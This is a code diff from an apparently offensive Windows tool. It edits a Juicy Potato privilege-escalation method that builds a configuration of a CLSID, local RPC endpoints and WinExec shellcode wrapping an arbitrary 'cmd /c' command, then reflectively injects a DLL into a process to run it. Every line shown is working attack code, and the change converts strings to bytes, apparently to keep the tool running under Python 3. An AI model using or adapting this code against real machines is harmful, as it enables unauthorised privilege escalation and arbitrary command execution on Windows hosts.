@@ -148,30 +148,30 @@ class Privesc_juicy_potato(Module):
         return parsed_response
 
     def __run_reflective_dll_version(self, cmd, custom_shellcode_path, logfile, clsid):
-        LogFile = logfile
-        remote_process = 'notepad.exe'
-        CLSID = clsid
-        ListeningPort = self.__random_listening_port
-        RpcServerHost = '127.0.0.1'
-        RpcServerPort = '135'
-        ListeningAddress = '127.0.0.1'
+        LogFile = logfile.encode()
+        remote_process = b'notepad.exe'
+        CLSID = clsid.encode()
+        ListeningPort = self.__random_listening_port.encode()
+        RpcServerHost = b'127.0.0.1'
+        RpcServerPort = b'135'
+        ListeningAddress = b'127.0.0.1'
         if custom_shellcode_path == 'default':
-            shellcode_bytes = shellcode.winexec_x64 + 'cmd /c "' + cmd + '"\00'
+            shellcode_bytes = shellcode.winexec_x64 + b'cmd /c "' + cmd.encode() + b'"\00'
             thread_timeout = '60000'
         else:
             thread_timeout = '0'
             with open(custom_shellcode_path, 'rb') as file_handle:
                 shellcode_bytes = file_handle.read()
-        configuration = LogFile + '\00'
-        configuration += remote_process + '\00'
-        configuration += CLSID + '\00'
-        configuration += ListeningPort + '\00'
-        configuration += RpcServerHost + '\00'
-        configuration += RpcServerPort + '\00'
-        configuration += ListeningAddress + '\00'
-        configuration += str(len(shellcode_bytes)) + '\00'
+        configuration = LogFile + b'\00'
+        configuration += remote_process + b'\00'
+        configuration += CLSID + b'\00'
+        configuration += ListeningPort + b'\00'
+        configuration += RpcServerHost + b'\00'
+        configuration += RpcServerPort + b'\00'
+        configuration += ListeningAddress + b'\00'
+        configuration += str(len(shellcode_bytes)).encode() + b'\00'
         configuration += shellcode_bytes
-        configuration_bytes_csharp = '{' + ",".join('0x{:02x}'.format(x) for x in configuration.encode()) + '}'
+        configuration_bytes_csharp = '{' + ",".join('0x{:02x}'.format(x) for x in configuration) + '}'
         response = self.inject_dll_reflective_module_object.run(['juicypotato_reflective.dll', 'remote_virtual',
                                                                 'cmd.exe', thread_timeout, configuration_bytes_csharp])
         parsed_response = self._parse_response(response)
